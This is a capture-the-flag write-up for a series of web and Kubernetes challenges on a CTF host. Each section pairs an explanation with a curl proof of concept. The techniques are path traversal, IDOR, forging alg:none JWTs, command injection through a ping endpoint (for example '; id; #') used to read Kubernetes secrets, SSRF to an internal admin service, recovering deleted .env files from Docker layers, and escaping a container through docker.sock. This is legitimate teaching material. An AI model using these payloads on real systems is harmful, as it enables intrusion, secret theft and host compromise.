# WriteUps


## Swagger who goes there

### Vulnerability: Swagger Exposure

First we search for the robots.txt file to check if it reveals any hidden or sensitive path:
```
curl -s https://ctf.seoeh.ir/robots.txt
```
Resulted:
```
Disallow: /api/schema/
Disallow: /api/schema/swagger-ui/
Disallow: /swagger.json
```
All three paths look API-documentation-related. I opened them and SWAGGER flag was found in the swagger.json(and schema).

The PoC to trigger the flag:
```
curl -s https://ctf.seoeh.ir/swagger.json | grep -o 'HAMAMOOZ{[^}]*}'
```
* Why to search for **robots.txt**? Every serious website that wants to control what search engine crawlers index has this file at the root.

<br>
<br>

## Flag endpoint found it

### Vulnerability: Debug Endpoint

There is a strong clue in the parameter description in the Swagger file:
```json
"/api/internal/flag": {
    "get": {
        "operationId": "api_internal_flag_retrieve",
        "parameters": [
            {
                "in": "header",
                "name": "X-Debug-Mode",
                "schema": {
                    "type": "string"
                },
                "description": "Set to 'true' to enable debug mode."
            }
```

This shows that the endpoint accepts a header parameter named `X-Debug-Mode`. So we can send a GET request to this endpoint and include this header with the value set to `true`.
```
curl -s https://ctf.seoeh.ir/api/internal/flag -H "X-Debug-Mode: true"
```

The PoC to trigger the flag:
```
curl -s https://ctf.seoeh.ir/api/internal/flag -H "X-Debug-Mode: true" | grep -o 'HAMAMOOZ{[^}]*}'
```

<br>
<br>

## Path traversal is classic

### Vulnerability: Path Traversal

The `/api/reports/download` endpoint takes a `file` query parameter. In the Swagger documentation, the parameter is described as:
```json
"description": "Report filename to download (served from /app/reports/)."
```
This suggests that the backend uses the user-controlled file value as part of a filesystem path.
I started from ../ and there was a file: `flag.txt`.
I downloaded it and another flag was found.

The PoC to trigger the flag:
```
curl -s "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt"
```

<br>
<br>

## IDOR tenant leak

### Vulnerability: IDOR

Again I noticed an endpoint that retrieves reports from a specific organization:
```json
"/api/orgs/{org_id}/reports/{report_id}": {
    "get": {
        "operationId": "api_orgs_reports_retrieve",
        "parameters": [
            {
                "in": "path",
                "name": "org_id",
                "schema": {
                    "type": "integer"
                },
                "required": true
            },
```
In the Swagger file, this endpoint was defined with two path parameters: org_id and report_id. The description didn't mention any access control or authorization checks, which raised suspicion of a potential IDOR vulnerability.
After registering a new user (test1), I received a JWT token and I tested the endpoint with my own organization:
```
curl -s "https://ctf.seoeh.ir/api/orgs/1/reports/1" -H "Authorization: Bearer <my_token>"
```
As this user, I didn't have access to this report. So I tried other random organizations and report (org_id=2, report_id=2):
```
curl -s "https://ctf.seoeh.ir/api/orgs/2/reports/2"   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0NyIsInVzZXJuYW1lIjoidGVzdDEiLCJvcmciOiJBY21lIENvcnAiLCJyb2xlIjoidXNlciJ9.TjiYaGCBDE0CkUjPG1IRT14Q0YhQY357KK0EP8S9VZ8" | grep -o 'HAMAMOOZ{[^}]*}'
```


* I have found this flag in the db file next to the flag.txt file too.

    The PoC to trigger the flag:
    ```
    curl -s "https://ctf.seoeh.ir/api/reports/download?file=../db/db.sqlite3" -o db.sqlite3 &&
    strings db.sqlite3 | grep -oE 'HAMAMOOZ\{[^}]+\}'
    ```

<br>
<br>

## JWT alg none or weak secret

### Vulnerability: Insecure JWT validation

The Swagger file also exposed an admin endpoint: ‍‍‍`/admin/dashboard`<br>
This suggested that an admin panel existed, so I tried to find a way to access it. Since normal user tokens had `role: user`, I inspected the JWT implementation to see whether the role could be forged or bypassed.<br>
While enumerating the application files through the command injection vulnerability, I found a compiled Python file related to JWT handling: `/app/config/jwt.pyc`<br>
Since the source file was not directly readable, I inspected the bytecode using Python’s marshal and dis modules.
The disassembled code revealed two JWT weaknesses:
```
JWT_SECRET = changeme123
algorithm = HS256
alg:none accepted with verify_signature=False
```
This meant I could forge a JWT with an admin role. I created a new token with the same user fields but changed the role from user to admin, then used it to access the admin dashboard.

The PoC to trigger the flag:
```
ADMIN_TOKEN=$(python3 -c 'import base64,json; b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(",",":")).encode()).rstrip(b"=").decode(); print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"47","username":"test1","org":"Acme Corp","role":"admin"})+".")') && \
curl -s https://ctf.seoeh.ir/admin/dashboard \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  |grep -o 'HAMAMOOZ{[^}]*}'
```

<br>
<br>

## Metadata svc leaked my token

### Vulnerability: Command Injection

While reviewing the Swagger documentation, I found the following diagnostic endpoint: ‍‍‍`"/api/diag/ping"`<br>
The endpoint accepted a JSON body with a host parameter. Since it appeared to run a ping command on the server, I tested whether shell metacharacters were interpreted:
```
curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id; #"}'
```
The id command was executed successfully, confirming command injection.<br>
After confirming command execution, I checked the permissions of the pod’s Kubernetes service account: `kubectl auth can-i --list;`<br>
The output showed that the service account had broad read permissions: `*.*    [get list watch]`<br>
I listed the available namespaces: `kubectl get ns;`<br>
One namespace looked interesting: ctf-secrets<br>
Then I listed secrets across all namespaces: `kubectl get secrets -A;`<br>
This revealed: ctf-secrets   flag-secret<br>
I retrieved the secret: `kubectl get secret flag-secret -n ctf-secrets -o yaml;`<br>
Kubernetes stores secret values in base64 under the data field, so the value had to be decoded:<br>
```
echo 'SEFNQU1PT1p7bTN0NGQ0dDRfc3ZjX2wzNGszZF9teV90MGszbn0=' | base64 -d
```
This decoded the secret value and revealed the flag.

The PoC to trigger the flag:
```
curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl get secret flag-secret -n ctf-secrets -o jsonpath=\"{.data.flag}\" | base64 -d; #"}' \
  | grep -o 'HAMAMOOZ{[^}]*}'
```

<br>
<br>

## Privileged pod hostpath escape

### Vulnerability: Command Injection

After listing the namespaces, One namespace looked suspicious: `escape-zone`<br>
The name suggested that it might be related to a container escape challenge. I then listed pods across all namespaces: `kubectl get pods -A`<br>
Inside the escape-zone namespace, there was a single pod: `escape-zone   legacy-worker`<br>
I inspected the pod configuration: 
```
kubectl get pod legacy-worker -n escape-zone -o yaml;
```
The pod was configured with a privileged security context and a hostPath volume. This meant the container had elevated privileges and access to part of the host filesystem.

The PoC to trigger the flag:
```
curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"example.com; kubectl get pod legacy-worker -n escape-zone -o yaml; #"}' \
  | grep -o 'HAMAMOOZ{[^}]*}' \
  | head -n 1
```

<br>
<br>

## Command injection is still alive

### Vulnerability: Command Injection

After confirming command injection in `/api/diag/ping`, I used the same primitive to enumerate common filesystem locations such as `/app` and `/opt`.<br>
A normal `ls /opt` returned no visible files. However, since hidden files and directories in Linux start with `.`, I checked the directory with `ls -la /opt` and also used `find /opt -type f`. This revealed the hidden path `/opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt`.

The PoC to trigger the flag:

```
curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt; #"}' \
  | grep -o 'HAMAMOOZ{[^}]*}'
```

<br>
<br>

## SSRF into the internal net

### Vulnerability: SSRF

From the Swagger documentation, I found the endpoint: `POST /api/webhooks/test`<br>
It accepted a user-controlled url parameter, which made it a possible SSRF target.<br>
I also checked /api/events and found an internal log message: `integration ping -> admin-panel: ok`<br>
This leaked the name of an internal service: admin-panel.<br>
Using Kubernetes enumeration, I listed services: `kubectl get svc -A`<br>
This confirmed the service:
```
internal-tools   admin-panel   ClusterIP   10.96.89.190   80/TCP
```
Since it was a Kubernetes ClusterIP service, it was only reachable from inside the cluster. Kubernetes internal DNS follows this format: `<service>.<namespace>.svc.cluster.local`
So the internal admin panel URL was:
```
http://admin-panel.internal-tools.svc.cluster.local
```
The PoC to trigger the flag:
```
curl -s -X POST https://ctf.seoeh.ir/api/webhooks/test \
-H "Content-Type: application/json" \
-d '{"url":"http://admin-panel.internal-tools.svc.cluster.local","method":"GET"}' | grep -o 'HAMAMOOZ{[^}]*}'
```

<br>
<br>

## Docker layer never forget

### Vulnerability: Docker Layer Leak

I checked the build history of the backend image:
```
docker history --no-trunc hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend
```

Two layers stood out:
```
COPY .env.leaked /app/.env
RUN rm -f /app/.env
```

So a .env file was copied in and then deleted. But Docker layers are additive; Deleting a file in a later layer doesn't actually remove it from the earlier layer, it's still there. `docker save` didn't give me the real layers though (just the manifest for the multi-arch image), so I used skopeo to pull the layers directly from the registry instead:
```
skopeo copy docker://hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend dir:./skopeo_out
```

Then I checked each layer blob for .env:

```
for f in skopeo_out/*; do tar -tzf "$f" 2>/dev/null | grep -i "\.env"; done
```

One layer had app/.env (the real file), the next one only had app/.wh..env (a whiteout marker, which is how OverlayFS marks a deleted file). So I extracted the one with the real file and read it.

The PoC to trigger the flag:
```
skopeo copy docker://hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend dir:./skopeo_out

mkdir -p env_layer

skopeo copy docker://hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend dir:./skopeo_out
mkdir -p env_layer
tar -xzf skopeo_out/cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041 -C env_layer
grep -o 'HAMAMOOZ{[^}]*}' env_layer/app/.env
```

<br>
<br>

## VM escape

### Vulnerability: Container/VM Escape

The hint said the cluster was deployed with kind, which means every Kubernetes "node" is actually just a Docker container, not a real machine.

I already had access to legacy-worker (the privileged pod with /host mounted), so I looked for a Docker socket on the node itself:

Found /host/run/docker.sock. When I listed containers through this socket, I saw that the "node" (ctf-worker, ctf-worker2, ctf-control-plane) was itself running as a container on a different Docker daemon — meaning there was a real machine one level below.

So I used this socket to create a new privileged container that mounts the whole host filesystem:


After starting it and checking the logs, the flag showed up at `/realhost/home/ubuntu/flag.txt`. This confirmed I'd actually reached the real host machine, not just another container.
